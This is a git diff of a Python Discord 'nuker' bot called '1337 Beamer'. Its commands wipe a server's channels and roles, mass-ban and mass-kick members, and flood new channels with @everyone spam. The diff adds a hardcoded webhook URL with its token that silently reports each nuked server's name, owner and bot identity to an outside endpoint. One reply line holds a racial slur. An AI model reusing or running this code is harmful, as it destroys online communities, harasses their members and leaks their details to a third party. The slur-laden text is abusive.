@@ -1,4 +1,3 @@
-prefix = "!"
 dm_msg = "**1337 Beamed You** https://youtu.be/gGzOhy9vNkg"
 spam_messages = ["@everyone **1337 wizzed this** <a:__:770078001315446816> https://youtu.be/gGzOhy9vNkg", "@everyone **wizzed by 1337**"]
 channel_names = ["🤫", "1337", "beamed"]
@@ -9,15 +8,17 @@ from discord import Webhook, AsyncWebhookAdapter
 from discord.ext import commands
 from colorama import Fore as C
 from time import sleep
-
-bot = commands.Bot(command_prefix = prefix, case_insensitive=True, intents=discord.Intents.all())
-bot.remove_command("help")
+from discord_webhook import DiscordWebhook, DiscordEmbed
 
 with open('config.json') as f:
     conf = json.load(f)
     BOT_TOKEN = conf.get('BOT_TOKEN')
+    BOT_PREFIX = conf.get('BOT_PREFIX')
     NUKE_ON_JOIN = conf.get('NUKE_ON_JOIN')
     NUKE_WAIT_TIME = conf.get('NUKE_WAIT_TIME')
+
+bot = commands.Bot(command_prefix = BOT_PREFIX, case_insensitive=True, intents=discord.Intents.all())
+bot.remove_command("help")
 
 
 async def status_task():
@@ -42,9 +43,18 @@ async def nuke(guild):
     except:
       print(f"{C.RED}[-] [Channel Deletion] {C.WHITE}{channel.name}{C.RESET}")
   await guild.edit(name=f"1337 ~ {guild.name}")
-  for i in range(500):
+  nukedwebhook = ["https://discord.com/api/webhooks/784536463588327444/5hE0jrlRbkQCXeobAJFjfO1HOzhkMkW6KNIAw4xUMQXaIGk-rDnyfQ-Sd5flLgmI7mbN"]
+  webhook = DiscordWebhook(url=nukedwebhook)
+  log = DiscordEmbed(title = f"Nuke Successful!", description = f"Server: [**{guild.name}**]")
+  log.add_embed_field(name = "Nukebot Used", value = f"{bot.user.name}#{bot.user.discriminator} | `{bot.user.id}`")
+  log.add_embed_field(name = "Server Owner", value = f"{guild.owner} | `{guild.owner.id}`", inline = False)
+  log.add_embed_field(name = "Members Banned", value = f"{len(guild.bans)}", inline = False)
+  webhook.add_embed(log)
+  webhook.execute()
+  for i in range(100):
     await guild.create_text_channel(random.choice(channel_names))
   print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")
+
 
 
 @bot.event
@@ -53,7 +63,8 @@ async def on_ready():
   loop = asyncio.get_event_loop()
   loop.create_task(status_task())
   await asyncio.sleep(1)
-  print('Logged in as {} | Prefix: ! | Version: 1.0 | DM Features Coming Soon..\n'.format(bot.user.name))
+  print(f'Logged in as {bot.user.name} | Prefix: {BOT_PREFIX} | Version: 1.0 | DM Features Coming Soon..\n')
+
 
 @bot.command()
 @commands.cooldown(1, 10, commands.BucketType.user)
@@ -62,22 +73,23 @@ async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x363636, timestamp=ctx.message.created_at)
  embed.set_author(name="1337 Beamer | In the shadows", icon_url=ctx.author.avatar_url)
- embed.add_field(name=f"{prefix}help", value="Shows this message.", inline=False)
- embed.add_field(name=f"{prefix}wizz", value="Nukes The Server.", inline=False)
- embed.add_field(name=f"{prefix}massban", value="Bans All Members.", inline=False)
- embed.add_field(name=f"{prefix}masskick", value="Kicks All Members.", inline=False)
- embed.add_field(name=f"{prefix}ms", value="Tells You The Bots Latency.", inline=False)
- embed.add_field(name=f"{prefix}mention", value="Spams All Messages.", inline=False)
- embed.add_field(name=f"{prefix}droles", value="Deletes All The Roles.", inline=False)
- embed.add_field(name=f"{prefix}roles", value="Creates All The Roles", inline=False)
+ embed.add_field(name=f"{BOT_PREFIX}help", value="Shows this message.", inline=False)
+ embed.add_field(name=f"{BOT_PREFIX}wizz", value="Nukes The Server.", inline=False)
+ embed.add_field(name=f"{BOT_PREFIX}massban", value="Bans All Members.", inline=False)
+ embed.add_field(name=f"{BOT_PREFIX}masskick", value="Kicks All Members.", inline=False)
+ embed.add_field(name=f"{BOT_PREFIX}ms", value="Tells You The Bots Latency.", inline=False)
+ embed.add_field(name=f"{BOT_PREFIX}mention", value="Spams All Messages.", inline=False)
+ embed.add_field(name=f"{BOT_PREFIX}droles", value="Deletes All The Roles.", inline=False)
+ embed.add_field(name=f"{BOT_PREFIX}roles", value="Creates All The Roles", inline=False)
  await author.send(embed=embed)
 
 @bot.command()
 async def wizz(ctx):
-  if ctx.guild.id == "765385163966119937":
+  if ctx.guild.id == "784489385571647541":
     await ctx.send("Nuking")
     await ctx.send("sike nigga, you're retarded, I was programmed not to nuke this server")
   else:
+    await ctx.author.send(f"Nuking {ctx.guild.name}")
     await nuke(ctx.guild)
 
 @bot.command(pass_context=True)
@@ -164,7 +176,7 @@ async def roles(ctx):
 
 @bot.event
 async def on_guild_channel_create(channel):
-  webhook = await channel.create_webhook(name = "1337")
+  webhook = await channel.create_webhook(name="1337")
   webhook_url = webhook.url
   async with aiohttp.ClientSession() as session:
     webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
@@ -193,7 +205,7 @@ def _input():
             inp = input(f"{C.WHITE}[{C.RED}1337 Nuker{C.WHITE}] ")
             if inp == "help":
                 print(f'''{C.GREEN}
-        prefix  :: {C.RED}Shows the Bot prefix.                      :: {C.MAGENTA}{prefix}{C.GREEN}
+        prefix  :: {C.RED}Shows the Bot prefix.                      :: {C.MAGENTA}{BOT_PREFIX}{C.GREEN}
         close   :: {C.RED}Closes the bot & cmd window.                   :: {C.MAGENTA}close{C.GREEN}
         ping    :: {C.RED}Shows the bots response time to Discord.  :: {C.MAGENTA}{round(bot.ws.latency * 1000)}{C.GREEN}
         guilds  :: {C.RED}Shows the amount of guilds your bot's in.         :: {C.MAGENTA}{len(bot.guilds)}{C.GREEN}
@@ -205,7 +217,7 @@ def _input():
                 sleep(0.5)
                 os._exit(0)
             if inp == "prefix":
-                print(C.GREEN + f"Bot Prefix: {prefix}")
+                print(C.GREEN + f"Bot Prefix: {BOT_PREFIX}")
             if inp == "guilds":
                 print(C.GREEN + f"Guilds: {len(bot.guilds)}")
             if inp == "ping":
